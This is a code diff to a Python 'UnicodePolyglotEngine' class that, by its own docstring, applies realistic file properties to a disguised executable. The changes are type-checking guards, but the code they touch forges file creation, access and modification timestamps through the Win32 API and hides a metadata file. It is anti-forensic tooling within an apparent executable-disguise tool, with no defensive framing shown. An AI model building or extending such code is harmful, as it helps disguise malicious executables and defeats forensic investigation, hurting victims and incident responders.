@@ -284,7 +284,7 @@ class UnicodePolyglotEngine:
         """Apply realistic file properties to disguised executable."""
         
         try:
-            if not WIN32_AVAILABLE:
+            if not WIN32_AVAILABLE or not all([win32file, win32con, win32api, pywintypes]):
                 self.logger.warning("Win32 API not available, skipping file properties")
                 return
             
@@ -307,28 +307,28 @@ class UnicodePolyglotEngine:
                     pass  # Use current time
             
             # Apply timestamps using Win32 API
-            handle = win32file.CreateFile(
+            handle = win32file.CreateFile(  # type: ignore
                 file_path,
-                win32con.GENERIC_WRITE,
-                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
+                win32con.GENERIC_WRITE,  # type: ignore
+                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,  # type: ignore
                 None,
-                win32con.OPEN_EXISTING,
-                win32con.FILE_ATTRIBUTE_NORMAL,
+                win32con.OPEN_EXISTING,  # type: ignore
+                win32con.FILE_ATTRIBUTE_NORMAL,  # type: ignore
                 None
             )
             
             def datetime_to_filetime(dt):
                 timestamp = int((dt - datetime(1601, 1, 1)).total_seconds() * 10**7)
-                return pywintypes.Time(timestamp)
+                return pywintypes.Time(timestamp)  # type: ignore
             
-            win32file.SetFileTime(
+            win32file.SetFileTime(  # type: ignore
                 handle,
                 datetime_to_filetime(created_time),
                 datetime_to_filetime(accessed_time),
                 datetime_to_filetime(modified_time)
             )
             
-            win32api.CloseHandle(handle)
+            win32api.CloseHandle(handle)  # type: ignore
             
             self.logger.info("✓ File properties applied successfully")
             
@@ -371,9 +371,9 @@ class UnicodePolyglotEngine:
                 json.dump(metadata, f, indent=2)
             
             # Hide the metadata file
-            if WIN32_AVAILABLE:
+            if WIN32_AVAILABLE and win32file and win32con:
                 try:
-                    win32file.SetFileAttributes(str(metadata_path), win32con.FILE_ATTRIBUTE_HIDDEN)
+                    win32file.SetFileAttributes(str(metadata_path), win32con.FILE_ATTRIBUTE_HIDDEN)  # type: ignore
                 except:
                     pass
             
